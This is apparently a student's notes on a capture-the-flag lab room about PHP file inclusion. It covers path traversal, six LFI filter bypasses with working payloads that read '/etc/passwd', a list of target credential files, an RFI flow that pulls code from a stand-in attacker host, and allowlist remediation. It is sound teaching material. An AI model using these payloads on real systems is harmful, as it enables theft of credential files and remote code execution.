# File Inclusion

## Overview

File inclusion vulnerabilities allow an attacker to manipulate a web application's file-loading logic to read, include, or execute files that were never intended to be accessible. They span three OWASP Top 10 categories: Path Traversal under Broken Access Control (A01), LFI under Injection (A03), and the PHP configuration enabling RFI under Security Misconfiguration (A05). This room builds from the root cause through six escalating bypass scenarios to Remote File Inclusion and concludes with remediation.

**Main objectives:** Understand path traversal, LFI, and RFI mechanics; work through six filter bypass techniques in lab environments; understand how to develop a testing methodology for file inclusion.

**Skills introduced:** Path traversal with `../` sequences, null byte bypass, keyword filter bypass with path manipulation, double-encoding traversal against stripping filters, forced directory prefix bypass, RFI via attacker-hosted files, PHP configuration awareness (`allow_url_fopen`, `allow_url_include`).

---

## Concepts Covered

### Path Traversal

**Definition:** Path traversal (directory traversal) allows an attacker to read files outside the web application's root directory by manipulating a file path parameter with `../` sequences.

**Why it matters:** The web server runs as a system user. If that user has read access to sensitive system files (`/etc/passwd`, SSH private keys, configuration files), path traversal exposes them directly through the web application.

**How it works:**
```
Normal request:
  GET /get.php?file=userCV.pdf
  Server reads: /var/www/app/CVs/userCV.pdf

Traversal attack:
  GET /get.php?file=../../../../etc/passwd
  Server resolves: /var/www/app/CVs/../../../../etc/passwd = /etc/passwd
```

Each `../` moves up one directory level. The attacker chains enough sequences to escape the application directory and reach the filesystem root.

**Vulnerable PHP code pattern:**
```php
$file = $_GET['file'];
echo file_get_contents('/var/www/app/CVs/' . $file);
```
The user input is concatenated directly into the file path — no validation at all.

**Common target files:**

| Path | Contents |
|------|---------|
| `/etc/passwd` | User account list |
| `/etc/shadow` | Hashed passwords (requires elevated access) |
| `/root/.ssh/id_rsa` | Root's SSH private key |
| `/var/log/apache2/access.log` | Web server access log (useful for log poisoning) |
| `/proc/version` | Linux kernel version |
| `/etc/issue` | OS identification before login prompt |
| `C:\boot.ini` | Windows boot configuration (BIOS systems) |
| `C:\windows\win.ini` | Windows initialisation file |

**Windows path traversal:** Uses the same `../` logic but with Windows paths as targets. Both `\` and `/` may work depending on the PHP version and OS configuration.

---

### Local File Inclusion (LFI)

**Definition:** LFI is a step beyond path traversal. Instead of just reading a file, the attacker causes the web application to **include and execute** the file through PHP functions like `include()`, `require()`, `include_once()`, or `require_once()`. If the included file contains PHP code, that code is executed — not just displayed.

**Why this matters:** LFI can escalate from information disclosure to Remote Code Execution if:
- A local file containing attacker-controlled PHP code can be found or created (e.g., a log file poisoned with PHP payloads via User-Agent injection)
- A file upload vulnerability allows placing a PHP file on the server

**Root cause:** The same as path traversal — user input passed directly to a file-handling function with no validation:
```php
include($_GET["lang"]);         // No directory prefix — full path accepted
include("languages/" . $_GET['lang']);  // Directory prefix — but still traversable
```

---

### Six LFI Bypass Scenarios

#### Scenario 1: No Directory in include()
The include call takes user input directly — no prefix, no filtering.

```
/index.php?lang=/etc/passwd
```
Works because no restrictions are in place.

---

#### Scenario 2: Hardcoded Directory Prefix
The code prepends `languages/` to the user input.

```php
include("languages/" . $_GET['lang']);
```

Attack: Use traversal to escape the languages directory:
```
/index.php?lang=../../../../etc/passwd
```
The path becomes `languages/../../../../etc/passwd`, traversing out.

**Pro tip:** Submit an invalid value (e.g., `?lang=THM`) to trigger an error. The error reveals the exact directory and path depth:
```
Warning: include(languages/THM.php): failed to open stream...
  in /var/www/html/THM-4/index.php on line 12
```
This shows: the app is at `/var/www/html/THM-4/` (4 levels deep) and appends `.php`.

---

#### Scenario 3: Appended .php Extension + Null Byte Bypass
The app appends `.php` to input before including. The server looks for `/etc/passwd.php` instead of `/etc/passwd`.

**Bypass:** Null byte injection:
```
/index.php?lang=../../../../etc/passwd%00
```
The `%00` (null byte) terminates the string for the underlying C library. The PHP `include()` call becomes `include("languages/../../../../etc/passwd")` — the `.php` suffix is ignored.

> **Important:** This was patched in PHP 5.3.4 and above. Only applicable to legacy applications.

---

#### Scenario 4: Keyword Filter on Known Paths
The application filters the literal string `/etc/passwd`.

**Bypasses:**
```
/index.php?lang=/etc/passwd/.        # . = current directory → resolves to /etc/passwd
/index.php?lang=/etc/passwd%00       # Null byte approach (legacy PHP)
```
The filter checks the raw string but the filesystem still resolves the modified path correctly.

---

#### Scenario 5: Stripping ../ from Input
The application performs a single-pass removal of all `../` sequences from user input.

**Effect:** `../../../../etc/passwd` becomes `etc/passwd` after stripping.

**Bypass — double-nested traversal:**
```
....//....//....//....//etc/passwd
```

**Why it works:**
- Filter removes the inner `../` from each `....//:` `..` + removed `../` + `/` → `../`
- The outer shell reconstitutes a valid traversal sequence after the single-pass removal

Resulting path after filter: `../../../../etc/passwd` — exactly what we wanted.

---

#### Scenario 6: Forced Directory Prefix in Input
The application validates that the user input **starts with** a specific directory (e.g., `languages/`). Requests that don't start with this string are rejected.

**Attack:** Include the required prefix, then traverse out:
```
/index.php?lang=languages/../../../../../etc/os-release
```

The validation check is satisfied (`languages/` is present at the start). The traversal sequences then navigate out of the `languages` directory to reach the target.

---

### Remote File Inclusion (RFI)

**Definition:** RFI allows the attacker to point the include function at a file hosted on their own server. The target application fetches the remote file and executes it.

**Why it is more dangerous than LFI:** The attacker controls the file content entirely. They do not need to find a file on the target — they simply host their payload externally.

**Requirement:** `allow_url_fopen` must be enabled in `php.ini`. This is often enabled by default.

**Attack flow:**
```
1. Attacker creates malicious file on their server:
   http://attacker.thm/cmd.txt → <?PHP echo "Hello THM"; ?>

2. Attacker injects the URL into the vulnerable parameter:
   http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt

3. Target server fetches the remote file via HTTP GET

4. Target server executes the returned PHP code

5. Output appears in the page — attacker has RCE
```

**In a real attack, `cmd.txt` would contain a web shell or reverse shell payload.**

**Key point:** The attacker never touches the target's filesystem. The vulnerable application's own include() function does all the work.

**Consequences of successful RFI:**
- Remote Code Execution (most critical)
- Sensitive information disclosure
- Cross-Site Scripting (XSS) via injected HTML
- Denial of Service
- Pivoting to internal network services

---

## Methodology

```
1. Identify entry points:
   - URL query parameters
   - POST body parameters
   - Cookies (less common but possible)
   - HTTP headers (Referer, User-Agent — rare but real)

2. Observe normal application behaviour:
   - What does valid input produce?
   - What errors appear for invalid input?
   - What does the error tell you? (path, function, appended extension)

3. Submit test input:
   - Try a single ../ and observe changes
   - Try an absolute path (/etc/passwd)
   - Try a non-existent filename to trigger errors

4. Identify active filters:
   - Is a directory prefix being added?
   - Is an extension being appended?
   - Are ../ sequences being stripped?
   - Is a specific directory required in the input?

5. Select the appropriate bypass:
   - Null byte (legacy PHP < 5.3.4)
   - /. appended to path
   - Double-nested ..// for stripping filters
   - Required prefix + traversal for forced-directory filters

6. Use Burp Suite to:
   - Modify POST body data
   - Modify cookie values
   - Inject into headers
   - Test payloads that cannot be sent from a browser form directly

7. For RFI testing:
   - Set up a listening server on the attacker machine
   - Host a test file with identifiable output
   - Inject the full URL into the parameter
   - Verify the server fetches it (check access logs)
```

---

## Practical Activities

### Lab 1 — Direct Path Inclusion (Scenario 1)
**Payload:** `?lang=/etc/passwd`
**Outcome:** `/etc/passwd` contents returned — no validation in include call

### Lab 2 — Traversal from Prefixed Directory (Scenario 2)
**Trigger error first:** `?lang=THM` → reveals `languages/THM.php failed in /var/www/html/THM-2/`
**Payload:** `?lang=../../../../etc/passwd`
**Outcome:** Traversal escapes `languages/` directory; `/etc/passwd` returned

### Lab 3 — Null Byte Bypass (Scenario 3)
**Context:** App appends `.php` to all input
**Payload:** `?lang=../../../../etc/passwd%00`
**Outcome:** Null byte terminates string before `.php` is appended; `/etc/passwd` returned

### Lab 4 — Keyword Filter Bypass (Scenario 4)
**Context:** Filter blocks the literal string `/etc/passwd`
**Payload:** `?lang=/etc/passwd/.`
**Outcome:** Filter doesn't match the modified string; filesystem resolves `/etc/passwd`

### Lab 5 — Strip Filter Bypass (Scenario 5)
**Context:** All `../` sequences are stripped in a single pass
**Payload:** `?lang=....//....//....//....//etc/passwd`
**Outcome:** After stripping inner `../`, valid `../../../../etc/passwd` remains

### Lab 6 — Forced Prefix Bypass (Scenario 6)
**Context:** Input must start with a required directory (discovered by error message)
**Target:** `/etc/os-release`
**Payload:** `?lang=languages/../../../../../etc/os-release`
**Outcome:** Required prefix passes validation; traversal navigates to target

---

## Observations and Analysis

- Error messages are critical intelligence in LFI testing — they reveal the full server path, the appended extension, and the include function in use
- Every filter has a bypass logic — understanding what the filter checks for is the first step to circumventing it
- PHP's `include()` executes code inside included files. A path traversal that reads `/etc/passwd` becomes LFI with code execution if the included file contains PHP code
- Log poisoning is a real LFI-to-RCE escalation: inject a PHP payload into a log file via User-Agent header, then include that log file via LFI
- RFI requires outbound HTTP from the server — internal networks with strict egress filtering may block this, making LFI the more reliable attack in some environments
- The `allow_url_fopen` directive enables both useful features and RFI; it should be disabled unless specifically needed

---

## Remediation Summary

| Control | What It Prevents |
|---------|----------------|
| **Input validation with allowlist** | Only permitted filenames map to valid paths; all else rejected |
| **Disable `allow_url_fopen` / `allow_url_include`** | Completely eliminates RFI as an attack vector |
| **Suppress detailed error messages in production** | Removes path/function/extension leak from attacker |
| **Keep PHP and OS updated** | Removes null byte bypass (patched in PHP 5.3.4) |
| **Web Application Firewall (WAF)** | Additional detection layer for `../`, null bytes, and URL-in-parameter patterns |

**Correct PHP allowlist pattern:**
```php
$allowed = ['en' => 'languages/EN.php', 'ar' => 'languages/AR.php'];
$lang = $_GET['lang'] ?? 'en';
if (array_key_exists($lang, $allowed)) {
    include($allowed[$lang]);
}
```
User input never touches the file path directly — it only selects from a predetermined mapping.

---

## Tools and Technologies Used

### Burp Suite
- **Purpose:** Intercept and modify HTTP requests for testing POST body, cookies, and header injection
- **How used:** Essential for lab scenarios where the injection point is not in the URL

### curl
- **Purpose:** Command-line HTTP client for crafting precise requests
- **Common usage:** `curl http://target/page.php?file=../../../../etc/passwd`

### Python HTTP Server
- **Purpose:** Host malicious files for RFI testing
- **Common usage:** `python3 -m http.server 8000`

---

## Key Learnings

- Path traversal = read files outside webroot; LFI = include and execute those files; RFI = include attacker-hosted files
- The `../` chain length depends on how deep in the filesystem the application sits — error messages reveal this
- Null byte bypass is legacy PHP only (< 5.3.4); still relevant for testing old applications
- Double-nested `....//` bypasses single-pass `../` stripping filters
- Error messages are the most valuable debugging tool — deliberately trigger them with invalid input
- File inclusion testing requires testing POST params, cookies, and headers — not just URL parameters
- RFI with `allow_url_fopen` = attacker controls execution; the vulnerable server does the fetching

---

## Things Worth Remembering

- `../` = move up one directory; chain as many as needed to reach filesystem root
- Error message → full path → count levels deep → determine how many `../` needed
- Appended `.php`? → null byte `%00` (legacy PHP) or find another bypass
- `../` stripped? → `....//` double-nested
- Forced prefix? → prefix + traversal (`required/../../../../target`)
- Keyword filter? → `/etc/passwd/.` or `/etc/passwd%00`
- RFI requires: `allow_url_fopen = On` in php.ini + outbound network access from server
- Prevention: allowlist mapping (never user-controlled path) + disable `allow_url_fopen` + suppress errors in production

---

## Conclusion

File inclusion vulnerabilities demonstrate how user-controlled input to file-handling functions creates a complete attack chain — from reading sensitive files through code execution via log poisoning or RFI. The six bypass scenarios reveal that naive filtering approaches are consistently defeatable, and that understanding what the filter checks is the key to circumventing it. The room's methodology — triggering errors deliberately, reading path information from those errors, and adapting payloads to the specific filter behaviour — reflects the systematic approach required for file inclusion testing in real engagements.
